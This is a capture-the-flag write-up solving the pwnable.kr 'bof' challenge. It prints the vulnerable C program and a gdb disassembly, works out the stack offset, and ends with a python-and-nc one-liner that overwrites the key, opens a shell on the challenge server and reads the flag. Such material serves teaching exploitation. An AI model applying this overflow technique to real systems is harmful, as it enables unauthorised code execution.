# How to solve bof.

```
/tmp/bof » cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

```
/tmp/bof » gdb ./bof
(gdb) b func
Breakpoint 1 at 0x632
(gdb) r
Starting program: /tmp/bof/bof

Breakpoint 1, 0x56555632 in func ()
(gdb) disas
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
=> 0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7e53870 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7e52fa0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7e2eb30 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7e53870 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7eebe60 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret

(gdb) b *func + 35
(gdb) c
```

%eax points to the address of |overflowme, and 0x8(%ebp) |key|.

```
(gdb) print/a $eax
$14 = 0xffffcafc
(gdb) print/a $ebp+8
$15 = 0xffffcb30
```

0xb30 - 0xafc = 52, meaning these addresses are 13 words apart.
With that,
```
/tmp/bof » (python -c 'print "\xbe\xba\xfe\xca" * 14'; cat -) | nc pwnable.kr 9000
cat flag
daddy, I just pwned a buFFer :)
```
